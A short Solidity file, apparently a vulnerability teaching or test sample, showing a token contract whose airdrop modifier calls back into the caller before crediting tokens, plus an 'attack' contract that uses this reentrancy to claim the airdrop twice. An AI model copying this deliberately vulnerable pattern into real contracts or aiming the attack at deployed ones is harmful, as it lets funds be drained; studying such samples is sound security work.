pragma solidity ^0.4.24;

contract ModifierEntrancy {
    mapping(address => uint) public tokenBalance;
    string constant name = "Nu Token";

    function airDrop() public hasNoBalance supportsToken {
        tokenBalance[msg.sender] += 20;
    }

    modifier supportsToken() {
        require(
            keccak256(abi.encodePacked(name)) ==
                Bank(msg.sender).supportsToken()
        );
        _;
    }

    modifier hasNoBalance() {
        require(tokenBalance[msg.sender] == 0);
        _;
    }
}

contract Bank {
    function supportsToken() external view returns (bytes32) {  // changed to view
        return keccak256("Nu Token");
    }
}

contract attack {
    bool hasBeenCalled;

    function supportsToken() external returns (bytes32) {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return keccak256("Nu Token");
    }

    function call(address token) public {
        ModifierEntrancy(token).airDrop();
    }
}